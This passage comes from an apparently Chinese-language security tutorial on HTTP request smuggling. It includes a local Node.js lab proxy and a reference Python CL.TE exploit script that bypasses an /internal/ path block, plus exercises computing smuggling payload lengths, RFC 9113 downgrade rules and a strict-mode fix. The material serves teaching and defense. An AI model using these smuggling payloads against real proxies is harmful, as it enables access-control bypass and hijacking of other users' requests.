      const cl = m ? parseInt(m[1], 10) : 0;
      if (respBuf.length < end + 4 + cl) break;
      const fullResp = respBuf.subarray(0, end + 4 + cl);
      respBuf = respBuf.subarray(end + 4 + cl);
      const cb = pendingCallbacks.shift();
      if (cb) cb(fullResp);
    }
  });
}

const STRICT_MODE = process.env.STRICT === '1';

const frontend = net.createServer((clientSock) => {
  let cBuf = Buffer.alloc(0);
  clientSock.on('data', (chunk) => {
    cBuf = Buffer.concat([cBuf, chunk]);
    while (true) {
      const hdrEnd = cBuf.indexOf('\r\n\r\n');
      if (hdrEnd === -1) break;
      const hdrText = cBuf.subarray(0, hdrEnd).toString('latin1');
      const lines = hdrText.split('\r\n');
      const [, reqPath] = lines[0].split(' ');
      const hasCL = lines.some((l) => /^content-length:/i.test(l));
      const hasTE = lines.some((l) => /^transfer-encoding:/i.test(l));

      // 修補開關：STRICT=1 時，看到同時帶 CL 與 TE 直接回 400 並斷線
      if (STRICT_MODE && hasCL && hasTE) {
        clientSock.end('HTTP/1.1 400 Bad Request\r\nContent-Length: 17\r\nConnection: close\r\n\r\nAmbiguous framing');
        cBuf = Buffer.alloc(0);
        break;
      }

      const clMatch = hdrText.match(/Content-Length:\s*(\d+)/i);
      const cl = clMatch ? parseInt(clMatch[1], 10) : 0;
      const totalLen = hdrEnd + 4 + cl;
      if (cBuf.length < totalLen) break;

      const rawReq = cBuf.subarray(0, totalLen);
      cBuf = cBuf.subarray(totalLen);

      // 前端代理的防線：直接擋掉外部對 /internal/ 的請求
      if (reqPath && reqPath.startsWith('/internal/')) {
        clientSock.write('HTTP/1.1 403 Forbidden\r\nContent-Length: 9\r\n\r\nForbidden');
        continue;
      }

      ensureUpstream();
      pendingCallbacks.push((resp) => clientSock.write(resp));
      upstreamSocket.write(rawReq);
    }
  });
});

backend.listen(18081, '127.0.0.1', () => {
  frontend.listen(18080, '127.0.0.1', () => {
    console.log(`Lab listening on 127.0.0.1:18080 (STRICT_MODE=${STRICT_MODE})`);
  });
});
```

在終端機執行 `node lab_smuggle.mjs` 跑起脆弱模式。接著寫一支 Python 腳本 `exploit_cl_te.py`，先送出 `45 bytes` 的 `CL.TE` 走私封包，再用第二條連線模擬無辜使用者送出 `GET /v1/balance`。

### 步驟 2：開啟嚴格模式驗證修補

停掉原本的程式，改跑 `STRICT=1 node lab_smuggle.mjs` 開啟雙標頭攔截，再跑一次同一支 Python 攻擊腳本，確認走私封包在前端代理就被 `400 Bad Request` 踢掉，後面無辜使用者的 `GET /v1/balance` 也能正常拿回自己的回應。

### 外部靶場對照檢查點（PortSwigger Web Security Academy）

本地跑通後，請到 **PortSwigger Web Security Academy** 挑戰下面 3 個經典實驗室，親手用 Burp Repeater 體會真實環境下的位元組計算：

1. **HTTP request smuggling, basic CL.TE vulnerability**（Practitioner）
   - **檢查點**：先送 `CL.TE` 時間探針確認後端會等待逾時，再把走私前綴塞進 `0\r\n\r\n` 後面，讓下一筆請求撞出後端不認識的 `GPOST` 方法報錯。
   - **卡點提示**：如果在 Burp Repeater 按了 Send 卻沒達成走私，先檢查右上角選單有沒有把自動更新長度的 **Update Content-Length** 關掉（或看你是不是需要讓它自動幫你算外層 CL），並打開 **Show non-printable chars** 確認每一行換行都是真的一對 `\r\n`（`2 bytes`），而不是只有 `\n`（`1 byte`）。
2. **HTTP request smuggling, basic TE.CL vulnerability**（Practitioner）
   - **檢查點**：自己手算一次第一行 chunk 的十六進位長度，確認有沒有把內層請求每一行的 `\r\n` 都算進去，而且外層的 `Content-Length` 要剛好只蓋到第一行區塊長度結尾。
   - **卡點提示**：如果後端一直回 `400 Bad Request`，檢查一下你走私的那筆內層 `POST` 請求，`Content-Length` 是不是設太小了，導致最後面的 `0\r\n\r\n` 沒被吞進 Body 裡，跑出來弄壞了下一筆請求的開頭。
3. **H2.CL request smuggling / HTTP/2 request smuggling via CRLF injection**（Practitioner / Expert）
   - **檢查點**：在 Burp Repeater 右側的 Inspector 面板確認協定切在 **HTTP/2**，試著把 `content-length` 改成 `0`，或是在標頭值裡面按 `Shift + Return` 插入真正的 `\r\n`（`0x0d 0x0a`），看看降級代理會不會把它拆成兩行標頭送給後端。

---

### 參考解答

下面是用原生 `socket` 寫的 `exploit_cl_te.py`（注意千萬別用 `requests` 或 `urllib`，因為高級 HTTP 套件會自動幫你重算 `Content-Length` 或擋掉雙標頭）：

```python
import socket

def recv_once(sock):
    return sock.recv(4096).decode('latin1', errors='replace')

# 0. 基線測試：直接打 /internal/admin 會被前端代理擋下來 (403 Forbidden)
with socket.create_connection(('127.0.0.1', 18080), timeout=3) as s:
    s.sendall(b"GET /internal/admin HTTP/1.1\r\nHost: localhost\r\n\r\n")
    print("[0] Direct access:\n", recv_once(s))

# 1. 構造一字不差的 45-byte CL.TE 走私 Body
smuggled_body = (
    b"0\r\n"
    b"\r\n"
    b"GET /internal/admin HTTP/1.1\r\n"
    b"X-Ignore: "
)
assert len(smuggled_body) == 45, f"Expected 45 bytes, got {len(smuggled_body)}"

req1 = (
    b"POST /v1/health HTTP/1.1\r\n"
    b"Host: api.nexuspay.example\r\n"
    b"Content-Length: 45\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    + smuggled_body
)

with socket.create_connection(('127.0.0.1', 18080), timeout=3) as s1:
    s1.sendall(req1)
    print("[1] Smuggle probe response:\n", recv_once(s1))

# 2. 模擬下一位無辜使用者從全新連線打進來的 GET /v1/balance
with socket.create_connection(('127.0.0.1', 18080), timeout=3) as s2:
    s2.sendall(
        b"GET /v1/balance HTTP/1.1\r\n"
        b"Host: api.nexuspay.example\r\n"
        b"Authorization: Bearer victim-jwt\r\n\r\n"
    )
    print("[2] Victim response (should hit /internal/admin):\n", recv_once(s2))
```

實際跑起來的輸出與驗證重點：

1. **脆弱模式**（`node lab_smuggle.mjs`）：
   - `[0]` 印出 `403 Forbidden`，證明直接打 `/internal/admin` 確實過不了前端代理這關。
   - `[1]` 印出 `200 OK`（`OK:POST:/v1/health`）。這時前端代理把 `45 bytes` 全送進了後端，但後端讀完前 `5 bytes`（`0\r\n\r\n`）就收工回傳了，把剩下的 `40 bytes` 留在 `upstreamSocket` 的 `buf` 緩衝區裡。
   - `[2]` 無辜使用者明明送的是 `GET /v1/balance`，拿到的回應卻是 `ADMIN_SECRET_ACCESS_GRANTED`！前端的路徑防線被徹底繞過。
2. **嚴格修補模式**（`STRICT=1 node lab_smuggle.mjs`）：
   - `[1]` 當場收到 `HTTP/1.1 400 Bad Request`（`Ambiguous framing`）並斷線，半個 byte 都沒寫進後端連線池。
   - `[2]` 無辜使用者順利拿到 `OK:GET:/v1/balance`，不再被前人留下的髒資料污染。

---

## 自我檢核

- **難度**：進階
- **預估時間**：25 分鐘

請拿出紙筆手算，不要靠自動化工具，推導下面 4 題的位元組長度與排查決策：

1. **手算 `CL.TE` 走私長度與 `Host` 陷阱**：假設目標是 `CL.TE` 架構，你想在 `0\r\n\r\n` 後面走私一筆 `DELETE /internal/cache HTTP/1.1`，附帶一行 `X-Tenant: tenant_a`，最後用未換行的 `X-Eat: ` 收尾（去吃掉下一位使用者的請求行），而且**故意不寫 `Host` 標頭**。請問外層的 `Content-Length` 應該填十進位的多少？為什麼在這裡自己先寫一行 `Host: internal` 反而是自找麻煩？
2. **手算 `TE.CL` 十六進位區塊大小**：在 `TE.CL` 架構下，你想走私下面這筆內層 `POST` 請求，而且希望它能剛好吃掉下一位使用者至少 `150 bytes` 的請求內容（每一行結尾都是 `\r\n`，最後的 `k=v` 後面緊接著區塊結尾 `\r\n` 與終止區塊 `0\r\n\r\n`）：
   - `POST /v1/log-dump HTTP/1.1`
   - `Host: 127.0.0.1`
   - `Content-Length: 160`
   - （空行）
   - `k=v`
   請算出第一行 chunk 大小該填的**十六進位值**，以及外層 `Content-Length` 該填的**十進位值**。
3. **HTTP/2 降級代理合規審查**：你在審查 NexusPay 邊緣代理的 HTTP/2 轉 HTTP/1.1 降級模組，現在外面送來下面三筆 HTTP/2 請求。根據 RFC 9113，哪幾筆請求 **MUST** 在代理層就當成畸形封包直接踢掉、絕對不准往後端轉？分別違反了哪一條規則？
   - (a) 標頭帶了 `content-length: 16`，但沒有 padding 的 `DATA` frame 實際載荷卻有 `48 bytes`。
   - (b) 標頭帶了 `te: trailers` 且 `content-length: 0`（沒有 `DATA` frame）。
   - (c) 標頭帶了 `user-agent: Mozilla/5.0\r\nX-Forwarded-For: 127.0.0.1`。
4. **線上排查順序與 `keepAliveTimeout` 迷思**：值班時你懷疑線上某組舊版代理跟 Node.js 之間有請求走私。在還有真實用戶流量的時候，你應該先打 `Content-Length: 4` 搭配 `1\r\nZ`，還是先打 `Content-Length: 6` 搭配 `0\r\n\r\nX`？如果真的打中漏洞卡住後端，幾秒後會收到 Nginx 的超時回應？這時有同事提議：「我們把 Node.js 的 `keepAliveTimeout` 從預設的 `5 s` 調短成 `1 s`，應該就能讓走私失效了吧？」你該怎麼反駁他？

---

### 參考解答

1. **`CL.TE` 長度計算與 `Host` 唯一性規則**：
   - 逐段相加：
     - `0\r\n\r\n` = `5 bytes`
     - `DELETE /internal/cache HTTP/1.1\r\n` = `31 + 2 = 33 bytes`
     - `X-Tenant: tenant_a\r\n` = `18 + 2 = 20 bytes`
     - `X-Eat: ` = `7 bytes`（結尾不換行）
   - 總長度：`5 + 33 + 20 + 7 = 65 bytes`，所以外層 `Content-Length` 要填 **`65`**。
   - **不能先寫 `Host` 的原因**：下一位無辜使用者的請求接上來時，只有第一行（例如 `GET /v1/balance HTTP/1.1`）會被 `X-Eat: ` 吞掉，他原本帶的第二行 `Host: api.nexuspay.example` 會變成這筆走私請求的標頭。如果你自己先寫了一行 `Host: internal`，後端就會收到兩個 `Host` 標頭，照 RFC 9112 §3.2 規定直接回 `400 Bad Request`，走私就破功了。
2. **`TE.CL` 區塊大小與外層 `CL` 計算**：
   - 先算內層 Chunk Payload 的位元組數：
     - `POST /v1/log-dump HTTP/1.1\r\n` = `26 + 2 = 28 bytes`
     - `Host: 127.0.0.1\r\n` = `15 + 2 = 17 bytes`（內層已封口，必須自帶 `Host`）
     - `Content-Length: 160\r\n` = `19 + 2 = 21 bytes`
     - `\r\n`（空行）= `2 bytes`
     - `k=v` = `3 bytes`
   - 區塊資料總長：`28 + 17 + 21 + 2 + 3 = 71 bytes`。換成十六進位：`71 = 4 × 16 + 7 = 0x47`，所以第一行區塊大小要寫 **`47\r\n`**。
   - 外層 `Content-Length`：`47\r\n` 剛好佔 **`4 bytes`**，所以外層 `Content-Length` 填 **`4`**。後端讀完這 `4 bytes` 就停手，把後面整筆 `POST /v1/log-dump` 留在緩衝區；此時內層 Body 已經有 `k=v\r\n0\r\n\r\n` 共 `10 bytes`，剛好會再吞掉下一位使用者 `160 - 10 = 150 bytes` 的資料。
3. **HTTP/2 降級合規判斷**：
   - **(a) MUST 當場踢掉**：違反 RFC 9113 §8.1.1。HTTP/2 請求只要帶了 `content-length`，數字就必須跟所有 `DATA` frame 的資料總長一模一樣（`16 != 48`），必須回 `PROTOCOL_ERROR`。
   - **(b) 合法放行**：RFC 9113 §8.2.2 雖然禁止連線專屬標頭，但特別開恩允許值剛好為 `trailers` 的 `te` 標頭，而且 `content-length: 0` 也跟沒有 `DATA` frame 的實際長度 `0` 吻合。
   - **(c) MUST 當場踢掉**：違反 RFC 9113 §8.2.1。HTTP/2 標頭值嚴禁出現 `\r`（`0x0d`）跟 `\n`（`0x0a`），不然一降級成 HTTP/1.1 就會憑空多出一行偽造的 `X-Forwarded-For: 127.0.0.1` 標頭。
4. **線上排查決策與 `keepAliveTimeout` 的真相**：
   - **探針順序**：一定要先打 **`Content-Length: 4` + `1\r\nZ`**（`CL.TE` 探針）。萬一目標是 `CL.TE` 而你先打 `0\r\n\r\nX`，那個多出來的 `X` 會進到後端共用連線池弄壞下一位正常客人的請求；反過來，先打 `1\r\nZ` 時，就算目標是 `TE.CL`，也只是在前端入口等你補資料，不會把半成品丟進後端池。
   - **超時秒數**：一旦後端卡住等不到剩下的位元組，會在滿 **`30 s`**（Nginx 的 `proxy_read_timeout = 30 s`）時收到 `504 Gateway Timeout`。
   - **為什麼調短 `keepAliveTimeout` 沒用**：`keepAliveTimeout` 管的是兩筆請求之間的**空閒發呆時間**（Idle Timeout）。在線上每秒兩千筆請求的高併發下，同一條後端連線隔不到幾毫秒就會塞進下一筆請求，根本不會閒置滿 `1 s`；攻擊者留下的那 `40 bytes` 在幾微秒內早就撞上下一位客人了。真要從連線層止血，只能徹底關掉上游連線複用（改走短連線 `Connection: close`），調短閒置時間完全是隔靴搔癢。

---

## 延伸閱讀

- **IETF RFC 9112 — *HTTP/1.1***（2022 年正式取代 RFC 7230）：必讀 Section 3.2（為什麼 `Host` 只能有一個）、Section 5.1（標頭冒號空白禁令）以及 Section 6.3（`Transfer-Encoding` 與 `Content-Length` 同時出現時的處理鐵則）。
- **IETF RFC 9113 — *HTTP/2***（2022 年正式取代 RFC 7540）：必讀 Section 8.1.1（`content-length` 與 `DATA` 長度核對）、Section 8.2.1（禁止 `\r`、`\n`、`\0`）以及 Section 8.2.2（禁用 `Transfer-Encoding` 等連線專屬標頭）。
- **James Kettle（PortSwigger Research）** — *HTTP Desync Attacks: Request Smuggling Reborn*（2019）與 *HTTP/2: The Sequel is Always Worse*（2021）：這兩篇經典研究直接把現代 `CL.TE`、`TE.CL`、時間差探測法與 HTTP/2 降級走私帶進了主流資安視野，非常值得一讀。
- **Node.js `llhttp` 安全公告（`CVE-2022-32213` 與 `CVE-2023-30589`）**：看看連每天跑在無數伺服器上的工業級 C 語言狀態機，在面對 RFC 邊角語法時是怎麼不小心踩坑又怎麼修補的。

